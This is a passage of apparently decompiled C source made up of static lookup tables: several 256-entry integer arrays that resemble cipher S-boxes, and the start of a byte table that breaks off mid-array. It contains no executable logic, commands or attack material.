int dword_525660[16] = { 0, 1, 4, 5, 16, 17, 20, 21, 64, 65, 68, 69, 80, 81, 84, 85 }; // weak
int dword_5256B4[8] = { 0, 1, 0, -1, 0, -1, 0, 1 }; // weak
int dword_5257E0[256] =
{
  821772500,
  -1616838901,
  1810681135,
  1059425402,
  505495343,
  -1677701677,
  1610868032,
  -811611831,
  -1076580569,
  -2000962123,
  -503103344,
  -1731160459,
  1852023008,
  365126098,
  -1025022435,
  584384398,
  677919599,
  -1065365415,
  -14452280,
  2002735330,
  1136869587,
  -550533546,
  -2005097446,
  -1563247315,
  -1580605226,
  879511577,
  1639411079,
  575934255,
  717107937,
  -1437329813,
  576097850,
  -1563213360,
  1725645000,
  -1484506833,
  5111599,
  767152862,
  -1751892052,
  1251459544,
  1383482551,
  -1242286169,
  -1205028113,
  -682503847,
  1878520045,
  1510570527,
  -2105841456,
  -1863518930,
  582008916,
  -1131521739,
  1265446783,
  1354458274,
  -765048560,
  -1092255443,
  -1221385584,
  -382003809,
  -1265703919,
  1275016285,
  -45759936,
  -1389258945,
  -990457810,
  1442611557,
  -709768531,
  -1582551634,
  -1563117715,
  -1046803376,
  -2011021070,
  208555832,
  -1528512553,
  1331405426,
  1447828783,
  -979610855,
  -1186340012,
  -1337562626,
  -1313428598,
  -955033379,
  1669711173,
  286233437,
  1465092821,
  1782121619,
  -432195616,
  710211251,
  980974943,
  1651941557,
  430374111,
  2051154026,
  704238805,
  -165996399,
  -1150146722,
  -1437564569,
  948965521,
  -961214997,
  -2067281012,
  718756367,
  -2025188313,
  -1563323541,
  718440111,
  -1437150575,
  -678870176,
  1113355533,
  -1816945114,
  410092745,
  1811985197,
  1944238868,
  -1598112708,
  1415722873,
  1682284203,
  1060277122,
  1998114690,
  1503841958,
  82706478,
  -1979811610,
  1068173648,
  845149890,
  -2127020283,
  1768146376,
  1993038550,
  -728140599,
  -904393265,
  940016341,
  -939893514,
  -1966926575,
  904371731,
  1205506512,
  -200306554,
  -1478344290,
  825647681,
  85914773,
  -1437123836,
  1249926541,
  1417871568,
  3287612,
  -1083912737,
  -1168660850,
  1975924523,
  1353700161,
  -1480510859,
  -1856369675,
  1800716203,
  722146342,
  -1421030953,
  1151126914,
  -134483355,
  -1417296397,
  458611604,
  -1428888796,
  -811287233,
  770352098,
  -1642050302,
  -927128148,
  -354462285,
  -708993384,
  -485346894,
  718646636,
  -1790760482,
  -1380039384,
  -663679127,
  -1437480689,
  -1434948618,
  575749918,
  -1437489253,
  718488780,
  2069512688,
  -746783827,
  453416197,
  1106044049,
  -1262275866,
  52586708,
  -916452660,
  -835158419,
  -1083461268,
  1785789304,
  218356169,
  -723568162,
  -535796774,
  1194783844,
  1523787992,
  -1287140202,
  1975193539,
  -1739514885,
  1341901877,
  -1249128598,
  -518059332,
  -1077543350,
  -1492456432,
  -1405528310,
  1057244207,
  1636348243,
  -533104082,
  1462225785,
  -1662303857,
  481089165,
  718503062,
  24497053,
  -962724087,
  -950311440,
  -639942440,
  -334596231,
  1195698900,
  -1323552140,
  -584791138,
  2115785917,
  -267303687,
  -769388879,
  -1770671107,
  -1548994731,
  -730060881,
  1372086093,
  1452307862,
  -1514465818,
  1476592880,
  -905696015,
  18495466,
  -1916818725,
  901398090,
  891748256,
  -1015329527,
  -1137676583,
  -1734007194,
  1447622437,
  -10594659,
  216884176,
  2086908623,
  1879786977,
  -706064143,
  -2052511630,
  -1356874329,
  -735885200,
  -1484321805,
  758861177,
  1121993112,
  215018983,
  642190776,
  -125730484,
  1196255959,
  2081185372,
  -786228903,
  941322904,
  -170724133,
  -1417443757,
  1848581667,
  -2089706338,
  -1114513338,
  -1705622162,
  -600236020,
  550028657,
  -1775511012,
  -504981761,
  -1321096440,
  2093648313,
  443148163,
  46942275,
  -1560820359,
  1117713533,
  1115362972,
  1523183689,
  -577827072,
  1551984063
}; // weak
int dword_525BE0[256] =
{
  522195092,
  -284448933,
  1776537470,
  960447360,
  -27144326,
  -289070982,
  1435016340,
  1929119313,
  -1381503111,
  1310552629,
  -715496498,
  -570149190,
  -1715195665,
  1594623892,
  417127293,
  -1579749389,
  -1598738565,
  1508390405,
  -300568428,
  -369108727,
  -599523194,
  -275495847,
  -1165767501,
  -524038661,
  -774225535,
  990456497,
  -107482687,
  -1511600261,
  21106139,
  -454561957,
  631373633,
  -511641594,
  532942976,
  396095098,
  -746928471,
  -27774812,
  -1730245761,
  2011709262,
  2039648873,
  620404603,
  -518797221,
  -1396440957,
  -682609371,
  -135634593,
  1645490516,
  223693667,
  1567101217,
  -932789415,
  1029951347,
  -824036160,
  -724009337,
  1550265121,
  119497089,
  972513919,
  907948164,
  -454338757,
  1613718692,
  -700789348,
  465323573,
  -1635712211,
  654439692,
  -1719371084,
  -1595678855,
  -1167264884,
  277098644,
  624404830,
  -194023426,
  -1577108705,
  546110314,
  -1891267468,
  -639589849,
  1321679412,
  -58175639,
  1045293279,
  -284295032,
  895050893,
  -1975175028,
  494945126,
  1914543101,
  -1517910853,
  -400202957,
  -2075229678,
  311263384,
  -19710028,
  -836236575,
  669096869,
  -710491566,
  -459844419,
  -975809059,
  -345608092,
  2005142349,
  -1581864959,
  -2066012503,
  -524982508,
  569394103,
  -439330720,
  1425027204,
  108000370,
  -1558535853,
  -623098027,
  -1251844673,
  1750473702,
  -2083886188,
  762237499,
  -321977893,
  -1496067910,
  -1233109668,
  -1351112951,
  867476300,
  964413654,
  1591880597,
  1594774276,
  -2115145887,
  552026980,
  -1268903048,
  -568826981,
  -2011389662,
  -1184422191,
  -2142656536,
  582474363,
  1582640421,
  1383256631,
  2043843868,
  -972191412,
  1217180674,
  463797851,
  -1531928725,
  480777679,
  -1576259579,
  -2005803165,
  -1176621109,
  214354409,
  200212307,
  -484358889,
  -1269553099,
  -1620891332,
  -297670871,
  1847405948,
  1342460550,
  510035443,
  -214695482,
  815934613,
  833030224,
  1620250387,
  1945732119,
  -1591306151,
  -328967100,
  1388869545,
  -838913114,
  -1607788735,
  2092620194,
  562037615,
  1356438536,
  -885045151,
  -1033119899,
  1688467115,
  -2144065930,
  631725691,
  -454635012,
  549916902,
  -839862656,
  394546491,
  837744717,
  2114462948,
  751520235,
  -2073412690,
  -1879607160,
  -295870218,
  2063029875,
  803036379,
  -1592380991,
  821456707,
  -1275401132,
  360699898,
  -276465204,
  -783098280,
  -617611938,
  -1892495847,
  812317050,
  49299192,
  -1724802347,
  -1035798001,
  -1478235216,
  -963753722,
  -1193663732,
  -2138951640,
  -589368376,
  -748703375,
  143268808,
  -1094662816,
  1638124008,
  -1129777843,
  -953159686,
  578956953,
  -2100989772,
  -656847223,
  -1961085764,
  807278310,
  658237817,
  -1325405530,
  1641658566,
  11683945,
  -1207972289,
  148645947,
  1138423386,
  -136210536,
  1981396783,
  -1893950556,
  -595183712,
  380097457,
  -1614572617,
  -1491898645,
  -960707010,
  441530178,
  -278386500,
  1375954390,
  761952171,
  891809099,
  -2111843818,
  157052462,
  -611126533,
  1592404427,
  341349109,
  -1856483457,
  1417898363,
  644327628,
  -2061934520,
  -1941197590,
  -2093457196,
  220455161,
  1815641738,
  182899273,
  -1299947508,
  -667585763,
  -592329145,
  -1404283158,
  1052606899,
  588164016,
  1681439879,
  -256527878,
  -1889623373,
  -65518014,
  167996282,
  1336969661,
  1688053129,
  -1555742370,
  1543734051,
  1046297529,
  1138201970,
  2121126012,
  115334942,
  1819067631,
  1902159161,
  1941945968,
  -2088274427,
  1159982321
}; // weak
int dword_525FE0[256] =
{
  -1913667008,
  637164959,
  -342868545,
  -401553145,
  1197506559,
  916448331,
  -1944074684,
  -1362179440,
  -1095632449,
  -285488406,
  -389080752,
  1373570990,
  -1844541434,
  -257096376,
  -516125309,
  -1838149419,
  286293407,
  124026297,
  -1293687596,
  1028597854,
  -1179670496,
  -86080800,
  -1603852661,
  -2106427090,
  1430237888,
  1218109995,
  -722495596,
  308166588,
  570424558,
  -2107958275,
  -1839872531,
  307733056,
  1310360322,
  -1159692289,
  1384269543,
  -1906895858,
  863238079,
  -1935703672,
  -1493414168,
  -914180699,
  -1463804489,
  1470087780,
  1728663345,
  -222478497,
  1090516929,
  532123132,
  -1905536319,
  1132193179,
  -1716503105,
  -1243888053,
  1670234342,
  1434557849,
  -1583888356,
  1241591150,
  -980923864,
  -859607183,
  -1203518957,
  1812415473,
  -2096527044,
  267246943,
  796911696,
  -675250306,
  38830015,
  1526438404,
  -1488465200,
  374413614,
  -1351565506,
  1489179520,
  1603809326,
  1920779204,
  168801282,
  260042626,
  -1936261715,
  1563175598,
  -1897293239,
  1356499128,
  -2077756256,
  514611088,
  2037363785,
  -2108498923,
  -272794213,
  -1502455427,
  -1381482280,
  1173701892,
  -94538749,
  -398540027,
  1334932762,
  -1839830590,
  602925377,
  -1459359442,
  1613172210,
  41346230,
  -1795332748,
  -1837529678,
  -2106139701,
  41386358,
  -122711667,
  1313404830,
  -1889440289,
  -492993522,
  -2077262461,
  873260488,
  -1766082942,
  -1816874680,
  -282051413,
  -1739608280,
  2006953883,
  -1831053811,
  575479328,
  -2076726648,
  2099895446,
  660001756,
  -1953465106,
  -1256205760,
  -406815517,
  -446253919,
  -1008115362,
  1022894237,
  1620365795,
  -845372607,
  1551255054,
  15374395,
  -724141951,
  -45656276,
  -143856167,
  -1113054564,
  310226346,
  1133119310,
  530038928,
  136043402,
  -1818198338,
  -1187460587,
  -1750057729,
  1036173560,
  -1927630100,
  1681395281,
  1758231547,
  -653318264,
  306774401,
  1575354324,
  -578881430,
  1990386196,
  -1180433560,
  -1839360625,
  1262092282,
  -1170624791,
  -1526738165,
  -84438213,
  1833535011,
  423410938,
  660763973,
  -2107837318,
  1639812000,
  -786545967,
  -827521804,
  310289298,
  272797111,
  -2106414734,
  -1838103384,
  310240523,
  677093832,
  1013118031,
  901835429,
  -402271695,
  1116285435,
  -1258496126,
  1337354835,
  243122523,
  520626091,
  277223598,
  -50526099,
  -100718455,
  1766575121,
  594173102,
  316590669,
  742362309,
  -758108674,
  -118531946,
  -456174886,
  -1793762457,
  1229605004,
  -1179211764,
  1552908988,
  -1982633147,
  979407927,
  -335492695,
  1148277331,
  176638793,
  -680281024,
  2083809052,
  40992502,
  1340822838,
  -1563414529,
  -759209788,
  -734067776,
  1354035053,
  122129617,
  7215240,
  -1562034347,
  -1176054596,
  -1576763370,
  -1755891661,
  -685736601,
  -569405635,
  1928887091,
  -1412673741,
  1988674909,
  2063640240,
  -1803878399,
  1459647954,
  -105150216,
  -1992162914,
  1113892351,
  -2057108768,
  1927010603,
  -292086935,
  1856122846,
  1594404395,
  -1350934163,
  -439777433,
  -819991598,
  1643104450,
  -240376463,
  -863880766,
  1730235576,
  -1310358575,
  -1210302878,
  2131803598,
  -116761544,
  267404349,
  1617849798,
  1616132681,
  1462223176,
  736725533,
  -1967909064,
  551665188,
  -1349068273,
  1749386277,
  -1719452699,
  1611482493,
  674206544,
  -2093698206,
  -652406496,
  728599968,
  1680547377,
  -1674552832,
  1388111496,
  453204106,
  -138743851,
  1094905244,
  -1540269039,
  -2093859131,
  -537967050,
  -1590442751,
  -372026596,
  -298502269
}; // weak
int dword_5263E0[256] =
{
  -1649212384,
  532081118,
  -1480688657,
  -764173672,
  1246723035,
  1689095255,
  -2058288061,
  -100528431,
  2116582143,
  -435177885,
  157234593,
  2045505824,
  -49963709,
  1687664561,
  -211542173,
  605965023,
  672431967,
  1336064205,
  -918355904,
  214114848,
  -36500688,
  -1062914225,
  489488601,
  605322005,
  -296939238,
  264917351,
  1912574028,
  756637694,
  436560991,
  202637054,
  135989450,
  85393697,
  -2142043904,
  -398565634,
  -1399130888,
  2145855233,
  -759632289,
  115294817,
  -1147233398,
  1922296357,
  -830144545,
  -177108991,
  1037454084,
  -1569774021,
  2127856640,
  1417604070,
  1148013728,
  1827919605,
  642362335,
  -1365194763,
  909348033,
  1346338451,
  -747167647,
  297154785,
  1917849091,
  -133254469,
  -1411362770,
  -326273058,
  1469521537,
  -514889914,
  -919383040,
  1763717519,
  136166297,
  -3996507,
  1295325189,
  2134727907,
  -1496815930,
  1566297257,
  -622039062,
  -1617793135,
  -1622793681,
  965822077,
  -1514181234,
  289653839,
  1133871874,
  -803123477,
  35685304,
  1068898316,
  418943774,
  672553190,
  642281022,
  -1948808592,
  1954014401,
  -1257840516,
  -215152091,
  2030668546,
  -454378623,
  672283427,
  1776201016,
  359975446,
  -544793758,
  555499703,
  -1524982023,
  1324923,
  69110472,
  152125443,
  -1118182190,
  -472820011,
  1340634837,
  798073664,
  1434183902,
  15393959,
  216384236,
  1303690150,
  -413745665,
  -583833172,
  -333991883,
  106373927,
  -1716533072,
  1455997841,
  1801814300,
  1578393881,
  1854262133,
  -1106788350,
  -1036888713,
  -1992297236,
  1539295533,
  -789824731,
  -1216341321,
  -1922221276,
  549938159,
  -1016683012,
  -1674041216,
  181285381,
  -1429646198,
  -324937785,
  68876850,
  488006234,
  1728155692,
  -1686799788,
  836007927,
  -1859735503,
  919367643,
  -955544762,
  -639210936,
  1457871481,
  40520939,
  1380155135,
  797931188,
  234455205,
  -2039165469,
  -304478997,
  397000196,
  739833055,
  -1217101923,
  -1423247436,
  -272413408,
  772369276,
  390177364,
  -441016267,
  557662966,
  740064294,
  1640166671,
  1699928825,
  -759025160,
  622006121,
  -669614174,
  68743880,
  1742502,
  219489963,
  1664179233,
  1577743084,
  1236991741,
  410585305,
  -1928479354,
  823226535,
  1050371084,
  -868347689,
  -708127818,
  212779912,
  -147848735,
  1819446015,
  1911218849,
  530248558,
  -808726225,
  -1042381801,
  -1408778645,
  -884694568,
  -1952772266,
  20547779,
  -1312477238,
  -1262603827,
  -663214074,
  312714466,
  1870521650,
  1493008054,
  -803280640,
  615382978,
  -191295547,
  -1760449851,
  1932181,
  -2098862126,
  278426614,
  6369430,
  -1020422879,
  -1381948929,
  697336853,
  2143000447,
  -1348553765,
  701099306,
  1558357093,
  -1489964244,
  -794148888,
  -1973632879,
  -727831321,
  216290473,
  -703935098,
  23009561,
  1996984579,
  -559924490,
  2024298078,
  -555526433,
  569400510,
  -1955208313,
  -1278933423,
  -1197095953,
  -655444270,
  -450642313,
  -1038793431,
  795471839,
  -1343849733,
  -193936206,
  -203363493,
  -691234698,
  971261452,
  534414648,
  428311343,
  -905940121,
  -1450097416,
  694888862,
  1227866773,
  -1838760277,
  -1251512727,
  -1680613926,
  -545389265,
  -618303460,
  459166190,
  -162323226,
  1794958188,
  51825668,
  -2042355394,
  -1210295856,
  2036672799,
  -858325693,
  1099053433,
  -1825845770,
  -1235762355,
  1323291266,
  2061838604,
  1018778475,
  -2061623042,
  -1741466242,
  334295216,
  -738217102,
  1065731521,
  183467730
}; // weak
int dword_5267E0[256] =
{
  2127105028,
  745436345,
  -1693554977,
  -1506576111,
  -1200979969,
  500390133,
  1155374404,
  389092991,
  150729210,
  -403369524,
  -771417344,
  1935325696,
  716645080,
  946045387,
  -1393155014,
  1774124410,
  -425531521,
  -255385395,
  -1001830378,
  -856309376,
  948246080,
  363898952,
  -427091765,
  1286266623,
  1598556673,
  68334250,
  630723836,
  1104211938,
  1312863373,
  613332731,
  -1917182722,
  1101634306,
  441780740,
  -1165007413,
  1917973735,
  -1784342747,
  -1056510761,
  -1750755318,
  -986072662,
  1299840618,
  -218892445,
  1756332096,
  -317940138,
  297047435,
  -504669560,
  -2029394256,
  -673156778,
  1311375015,
  1667687725,
  47300608,
  -995324411,
  -1820854927,
  201668394,
  1468347890,
  576830978,
  -700276535,
  -552361344,
  1958042578,
  1747032512,
  -735975956,
  1408974056,
  -928125517,
  682131401,
  1033214337,
  1545599232,
  -29830247,
  206503691,
  103024618,
  -1439739983,
  1337551222,
  -1865968379,
  -1331124364,
  -279600641,
  -442719550,
  -1498010329,
  -429243805,
  -547028961,
  247794022,
  -539142724,
  702416469,
  -1860275302,
  397379957,
  851939612,
  -1980197784,
  218229120,
  1380406772,
  62274761,
  214451378,
  -1124863830,
  -2018756887,
  -449154010,
  28563499,
  446592073,
  1693330814,
  -841240102,
  29968656,
  -1201094784,
  220656637,
  -1824330265,
  77972100,
  1667708854,
  1358280214,
  -230201629,
  -1899350335,
  325977563,
  -17726575,
  -74941897,
  -689440812,
  -939819575,
  811859167,
  -1225422370,
  -332840486,
  652502677,
  -1219075047,
  -162205755,
  -796043081,
  1217549313,
  -1044722817,
  -436251377,
  -1240977335,
  1538642152,
  -2015941030,
  -1419088159,
  574252750,
  -970198067,
  -1643608583,
  1758150215,
  141295887,
  -1575098336,
  -779392546,
  -201959561,
  -100482058,
  1082055363,
  -877406896,
  395511885,
  -1328083270,
  179534037,
  -648938740,
  -556279210,
  1092926436,
  -1798698154,
  257381841,
  -522066578,
  1636087230,
  1477059743,
  -1795732544,
  -483948402,
  -1619307167,
  -1008991616,
  90732309,
  1684827095,
  1150307763,
  1723134115,
  -1057921910,
  1769919919,
  1240018934,
  815675215,
  750138730,
  -2055174797,
  1234303040,
  1995484674,
  138143821,
  675421338,
  1145607174,
  1936608440,
  -1056364272,
  -1949737018,
  2105974004,
  323969391,
  779555213,
  -1290064927,
  -1433357198,
  1017501463,
  2098600890,
  -1666346992,
  -1354355806,
  -1612424750,
  1171473753,
  -638395885,
  -607759225,
  -203097778,
  393037935,
  159126506,
  1662887367,
  1147106178,
  391545844,
  -842634601,
  1891500680,
  -1278357646,
  1851642611,
  546529401,
  1167818917,
  -1100946725,
  -1446891263,
  -341495460,
  575554290,
  475796850,
  -160294100,
  450035699,
  -1943715762,
  844027695,
  1080539133,
  86184846,
  1554234488,
  -602941842,
  1972511363,
  2018339607,
  1491841390,
  1141460869,
  1061690759,
  -50418053,
  2008416118,
  -1943862593,
  -1426819754,
  1598468138,
  722020353,
  1027143159,
  212344630,
  1387219594,
  1725294528,
  -549779340,
  -1794813680,
  458938280,
  -165751379,
  1828119673,
  544571780,
  -791741851,
  -1997029800,
  1241802790,
  267843827,
  -1600356496,
  1397140384,
  1558801448,
  -512299613,
  1806446719,
  929573330,
  -2060054615,
  400817706,
  616011623,
  -173446368,
  -691198571,
  1761550015,
  1968522284,
  -241236290,
  -102734438,
  -289847011,
  872482584,
  -1154430280,
  -400359915,
  -2007561853,
  1963876937,
  -631079339,
  1584857000,
  -1319942842,
  1833426440,
  -269883436
}; // weak
int dword_526BE0[256] =
{
  -151351395,
  749497569,
  1285769319,
  -499941508,
  -1780807449,
  23610292,
  -319988548,
  844452780,
  -1080096416,
  -543038739,
  -2081400931,
  1676510905,
  448177848,
  -564216263,
  -208668878,
  -1987464904,
  871450977,
  -1072089155,
  -184105254,
  -463315330,
  -1559696743,
  1310974780,
  2043402188,
  1218528103,
  -1558931943,
  -20362283,
  -1592518838,
  -358606746,
  -1601905875,
  162023535,
  -1467457206,
  687910808,
  23484817,
  -510056349,
  -923595680,
  779677500,
  -791340750,
  -821040108,
  -137754670,
  -794288014,
  -46065282,
  -1828346192,
  -395582502,
  1958663117,
  925738300,
  1283408968,
  -625617856,
  1840910019,
  137959847,
  -1615139111,
  1239142320,
  1315376211,
  1547541505,
  1690155329,
  739140458,
  -1166157363,
  -361794680,
  -418658462,
  905091803,
  1548541325,
  -254505588,
  -1199483934,
  144808038,
  451078856,
  676114313,
  -1433239005,
  -1825259949,
  993665471,
  373509091,
  -1695926010,
  -269958290,
  -124727847,
  -2145227346,
  -1019173725,
  -545350647,
  -1500207097,
  1534877388,
  572371878,
  -1704353745,
  1753320020,
  -827184785,
  1405125690,
  -24562091,
  633333386,
  -1268610372,
  -819843393,
  632057672,
  -1448504441,
  1404951397,
  -412091417,
  -379060872,
  195638627,
  -1909183551,
  -392094743,
  1233155085,
  -938967556,
  -1914388583,
  -1592720992,
  2144565621,
  -631626048,
  -400582321,
  -1792488055,
  -46948371,
  -1200081729,
  1594115437,
  572884632,
  -909850565,
  767645374,
  1331858858,
  1475698373,
  -501085506,
  -762220865,
  1321687957,
  619889600,
  1121017241,
  -854753376,
  2070816767,
  -1461941520,
  1933951238,
  -199351505,
  890643334,
  -420837082,
  859025556,
  360630002,
  925594799,
  1764062180,
  -374745016,
  -216661367,
  979562269,
  -1484266952,
  -207227274,
  1949714515,
  546639971,
  1165388173,
  -1225075705,
  1495988560,
  922170659,
  1291546247,
  2107952832,
  1813327274,
  -888957272,
  -988938659,
  -53016661,
  153207855,
  -1981812549,
  1608695416,
  1150242611,
  1967526857,
  721801357,
  1220138373,
  -603679679,
  -938897509,
  2112743302,
  -1013304461,
  1111556101,
  1778980689,
  250857638,
  -1996459306,
  673216130,
  -1448478786,
  -1087215715,
  -732210315,
  -1286341376,
  -877599912,
  -2096160246,
  529510932,
  -747450616,
  -868464109,
  -1930022554,
  102533054,
  -2000056440,
  1617093527,
  1204784762,
  -1228385661,
  1019391227,
  1069574518,
  1317995090,
  1691889997,
  -633835293,
  510022745,
  -1056372496,
  1362108837,
  1817929911,
  -2110813536,
  805817662,
  1953603311,
  -595122559,
  120799444,
  2118332377,
  207536705,
  -2012665748,
  -174925679,
  145305846,
  -1786842363,
  -1208221763,
  -1033442961,
  1877257368,
  -1317802816,
  -1134513110,
  -1791715110,
  -73290222,
  759945014,
  254147243,
  -1527513877,
  -493448925,
  629083197,
  -1823953079,
  907280572,
  -394170550,
  940896768,
  -1543946173,
  -1669704510,
  -1133490345,
  -633214983,
  -1034235078,
  1425318020,
  -1317055227,
  1496677566,
  -306375224,
  2140652971,
  -1168455755,
  -1225335121,
  977771578,
  1392695845,
  1698528874,
  1411812681,
  1369733098,
  1343739227,
  -674079352,
  1142123638,
  67414216,
  -1192910559,
  -1206218102,
  1626167401,
  -1748673642,
  -353593061,
  697522451,
  33404913,
  143560186,
  -1699285259,
  994885535,
  1247667115,
  -435872459,
  -1595811755,
  -747942671,
  -180032021,
  -1326893788,
  -1095004227,
  -1562942769,
  1237921620,
  951448369,
  1898488916,
  1211705605,
  -1503978056,
  -2061723715,
  -696922321
}; // weak
int dword_526FE0[256] =
{
  -2048901095,
  858518887,
  1714274303,
  -809085293,
  713916271,
  -1415853806,
  -564131679,
  539548191,
  36158695,
  1298409750,
  419087104,
  1358007170,
  749914897,
  -1305286820,
  1261868530,
  -1299773474,
  -1604338442,
  -851344919,
  -514842356,
  -498142787,
  -1318534271,
  -35330167,
  1551479000,
  512490819,
  1296650241,
  951993153,
  -1858277859,
  -1834509249,
  144139966,
  -1158763020,
  310820559,
  -1226126567,
  643875328,
  1969602020,
  1680088954,
  -2109154135,
  -1011634842,
  672358534,
  198762408,
  896343282,
  276269502,
  -1280120370,
  84060815,
  197145886,
  376173866,
  -351076478,
  -481793775,
  -749898474,
  1316698879,
  1598252827,
  -1661542345,
  1233235075,
  859989710,
  -1936506441,
  -791128896,
  -885363576,
  1203513385,
  1193654839,
  -1502948821,
  2060853022,
  207403770,
  1144516871,
  -1226335902,
  1121114134,
  177607304,
  -509230994,
  326409831,
  1929119770,
  -1311688201,
  -111659195,
  -820388008,
  -1094453418,
  -1066485200,
  119610148,
  1170376745,
  -916573825,
  -1131494127,
  951863017,
  -957941228,
  -1159178166,
  -1387348922,
  1183797387,
  2015970143,
  -249292741,
  -2111980897,
  -1342828556,
  -366195091,
  384012900,
  -1839969653,
  10178499,
  -1415148307,
  -1698074760,
  111523738,
  -1299878290,
  451689641,
  -1098676600,
  235406569,
  1441906262,
  -404408773,
  -1281232291,
  -136397947,
  1644036924,
  376726067,
  1006849064,
  -630387596,
  2041234796,
  1021632941,
  1374734338,
  -1728515238,
  371631263,
  -287823063,
  490221539,
  206551450,
  -1154328712,
  1053219195,
  1853335209,
  -882537636,
  -732811065,
  735133835,
  1623211703,
  -1190752904,
  -1556654860,
  -198129539,
  -928574718,
  -1184003022,
  -338368578,
  -1098146515,
  2038037254,
  -417180920,
  -1955213449,
  300912036,
  -528234408,
  -1922336657,
  1516443558,
  -94570592,
  1574567987,
  -225525840,
  -172375280,
  -1595227520,
  146372218,
  -1546005840,
  2043888151,
  35287437,
  -1698286742,
  655490400,
  1132482787,
  110692520,
  1031794116,
  -2106774545,
  1324057718,
  1217253157,
  919197030,
  686247489,
  -1033827638,
  1028237775,
  -1159480865,
  -1235251738,
  -1834045596,
  986174950,
  -1633155831,
  -232062595,
  -1541980304,
  -585230653,
  367056889,
  1353824391,
  731860949,
  1650113154,
  1778481506,
  784341916,
  357075625,
  -686364864,
  1074092588,
  -1814914526,
  -483541094,
  92751289,
  877911070,
  -694605458,
  1231880047,
  480201094,
  -538776313,
  -1200471343,
  434011822,
  87971354,
  363687820,
  1717726236,
  1901380172,
  -368563414,
  -1813305031,
  400339184,
  1490350766,
  -1633512197,
  1389319756,
  -1736180122,
  784598401,
  1983468483,
  30828846,
  -744439544,
  -1578691058,
  -453845082,
  1765724805,
  1955612312,
  1277890269,
  1333098070,
  1564029816,
  -1590549681,
  1026694237,
  -1007296108,
  1260819201,
  -945880529,
  1016692350,
  1582273796,
  1073413053,
  1995943182,
  694588404,
  1025494639,
  -971094594,
  -743068876,
  -148112969,
  453260480,
  1316140391,
  1435673405,
  -1256025343,
  -808277889,
  1622062951,
  403978347,
  817677117,
  950059133,
  -48888078,
  -1016901221,
  1486738320,
  1417279718,
  481875527,
  -1745002071,
  -361276940,
  760697757,
  1452955855,
  -397515859,
  1177426808,
  1702951038,
  -209618668,
  -1847962124,
  1084371187,
  -778531019,
  -1226630958,
  1073369276,
  1027665953,
  -1010778706,
  1230553676,
  1368340146,
  -2068720784,
  267243139,
  -2020746534,
  -224233017,
  -1797252120,
  -1871614133,
  -1790211421
}; // weak
int dword_5273E0[256] =
{
  -501862387,
  -1143078916,
  -1477715267,
  895778965,
  2005530807,
  -423554533,
  237245952,
  86829237,
  296341424,
  -443207919,
  -320366326,
  -1819881100,
  709006108,
  1994621201,
  -1322389702,
  937287164,
  -560275791,
  168608556,
  -1105629143,
  -2069886656,
  -1155253745,
  -1261357105,
  -1269925392,
  77524477,
  185966941,
  1208824168,
  -1950622118,
  1721625922,
  -940775375,
  1066374631,
  1927223579,
  1971335949,
  -1811463599,
  1551748602,
  -1413583517,
  -1438637724,
  -1291725814,
  48746954,
  1398218158,
  2050065058,
  313056748,
  -39177379,
  393167848,
  1912293076,
  940740642,
  -829121836,
  -1203279443,
  -1772365726,
  -2097950635,
  1727764327,
  364383054,
  492521376,
  1291706479,
  -1030830920,
  1474851438,
  1685747964,
  -1719247548,
  1619776915,
  1814040067,
  970743798,
  1561002147,
  -1369198606,
  2123093554,
  1880132620,
  -1143779255,
  697884420,
  -1743981526,
  -1687292783,
  -1635852973,
  110200136,
  1489731079,
  997519150,
  1378877361,
  -767096628,
  478029773,
  -1528094373,
  1022481122,
  431258168,
  1112503832,
  897933369,
  -1659379993,
  669726182,
  -911214981,
  918222264,
  163866573,
  -1047981903,
  -518144133,
  114105080,
  1903216136,
  761148244,
  -723629734,
  1690750982,
  -1128217044,
  1037045171,
  1888456500,
  2010454850,
  642736655,
  616092351,
  365016990,
  1185228132,
  -120068786,
  1043824992,
  2023083429,
  -2053368411,
  -431646840,
  -1015298209,
  -620250612,
  108438443,
  2132974366,
  830746235,
  606445527,
  -121703310,
  -2090861384,
  1844756978,
  -1762283115,
  -49614596,
  -1325526196,
  -498045635,
  1335562986,
  -233442779,
  -1574734993,
  -1615543256,
  634407289,
  885462008,
  -1000242809,
  -361075048,
  2094100220,
  339117932,
  -246136569,
  -1092686316,
  1458155303,
  -1605721023,
  1022871705,
  -1829979418,
  -580451987,
  353796843,
  -1472008481,
  -38117196,
  -242189451,
  551748367,
  618185374,
  -516331717,
  -274317384,
  1904685140,
  -1225601221,
  -1624087486,
  -887774004,
  -1340455676,
  -236683891,
  -2075517979,
  -1159208996,
  1120655984,
  -847401462,
  1474845562,
  -717268234,
  550456716,
  -828058584,
  2043752612,
  881257467,
  869518812,
  2005220179,
  938474677,
  -989427848,
  -444550170,
  1315485940,
  -976702594,
  226533026,
  965733244,
  321539988,
  1136104718,
  804158748,
  573969341,
  -586757470,
  937399083,
  -1004240247,
  -1393300541,
  1461057207,
  -281773859,
  -228105873,
  -1052193820,
  -1873641122,
  1581322155,
  -1266015131,
  786071460,
  -394575644,
  -376528764,
  1485433313,
  -271347460,
  -586689701,
  -616016236,
  953673138,
  1467089153,
  1930354364,
  1533292819,
  -1802404273,
  1346121658,
  1685000834,
  1965281866,
  -529033579,
  -104760689,
  2052792609,
  -779634538,
  690371149,
  -1169093409,
  -2114683745,
  -1391369235,
  -361014939,
  436236910,
  289419410,
  14314871,
  1242357089,
  -1390459389,
  1616633776,
  -1628585116,
  585885352,
  -823668086,
  -1595459936,
  1432659641,
  277164553,
  -940863689,
  770115018,
  -1991158001,
  -553024981,
  -1117185428,
  -1441602318,
  -2025513969,
  -520707462,
  987383833,
  1290892879,
  225909803,
  1741533526,
  890078084,
  1496906255,
  1111072499,
  916028167,
  243534141,
  1252605537,
  -2090805125,
  531204876,
  290011180,
  -378133083,
  102027703,
  237315147,
  209093447,
  1486785922,
  220223953,
  -1536771298,
  -119928190,
  82940208,
  -1167176000,
  -1725542044,
  518464269,
  1353887104,
  -353474559,
  -1917672829,
  -359926370
}; // weak
_UNKNOWN unk_5277E0; // weak
char byte_528828[256] =
{
  '\xD9',
  'x',
  '\xF9',
  '\xC4',
  '\x19',
  '\xDD',
  '\xB5',
  '\xED',
  '(',
  '\xE9',
  '\xFD',
  'y',
  'J',
  '\xA0',
  '\xD8',
  '\x9D',
  '\xC6',
  '~',
  '7',
  '\x83',
  '+',
  'v',
  'S',
  '\x8E',
  'b',
  'L',
  'd',
  '\x88',
  'D',
  '\x8B',
  '\xFB',
  '\xA2',
  '\x17',
  '\x9A',
  'Y',
  '\xF5',
  '\x87',
  '\xB3',
  'O',
  '\x13',
  'a',
  'E',
  'm',
  '\x8D',
  '\t',
  '\x81',
